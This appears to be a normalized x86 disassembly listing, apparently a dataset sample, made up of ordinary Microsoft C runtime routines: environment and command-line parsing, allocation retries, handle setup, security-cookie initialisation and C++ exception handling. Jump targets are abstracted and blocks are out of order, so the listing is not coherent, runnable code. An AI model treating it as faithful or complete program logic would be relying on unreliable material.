push esi
call sub_419ffc
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_41a9de
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_415170
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_41aa23
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b2ad
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_41aa6f
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4162f5
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_41aabd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_41c084
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_41ab0d
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_420469
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_41aa23
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_418e20
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_418e20
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_415093
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_41aa23
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_415093
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_418db8
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_415289
add esp 0x14
sub_41abeb
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_4204da
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_4204da
pop ecx
test eax eax
je r-xdata
call sub_4204da
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_41ad85
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_420469
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_41abeb
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_41a9de
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_41abeb
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_41ae40
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_41a9de
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_41a9de
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_41a3c0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_415093
pop ecx
mov [ ebp - 0x4 ] ebx
sub_41af77
push 0x54
push r--data
call sub_415ff4
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_41aa23
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_41aa23
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_416039
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_41ed13
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_41ed13
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_41b1cb
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_41b1f1
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_41b217
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_41b2ad
push 0xc
push r--data
call sub_415ff4
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_4162ac
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_416039
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_419d41
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_419057
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_419869
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b3a9
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_415f60
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_41b3cb
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_414f9c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41b3f4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_41504f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_41b41b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_418d30
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_41b47a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_41a075
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
call sub_41a075
add eax 0x90
dec [ eax ]
call sub_41a075
and [ eax + 0x90 ] 0x0
jmp sub_41c084
sub_41b4c3
push 0x10
push r--data
call sub_415ff4
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b589
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_41a075
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_416039
retn
call sub_41c0d0
call sub_41c0d0
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_41c120
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_41b5a4
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_41a075
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_41b5e9
push 0x8
push r--data
call sub_415ff4
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_416039
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_41580c
mov [ ebp - 0x4 ] 0xfffffffe
sub_41b63e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_41b667
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_41c0d0
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_41b41b
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_41b72b
push 0x2c
push r--data
call sub_415ff4
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_415abb
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_41a075
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_41a075
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_41a075
mov [ eax + 0x88 ] esi
call sub_41a075
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_415b60
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41b851
mov eax [ ebp - 0x1c ]
call sub_416039
retn
sub_41b7c4
mov esp [ ebp - 0x18 ]
call sub_41a075
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_41b4c3
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41b851
mov eax [ ebp - 0x1c ]
call sub_416039
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_41b851
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_415b0e
pop ecx
call sub_41a075
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_41a075
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_415ae7
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_41b5e9
pop ecx
pop ecx
sub_41b8c7
push 0xc
push r--data
call sub_415ff4
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
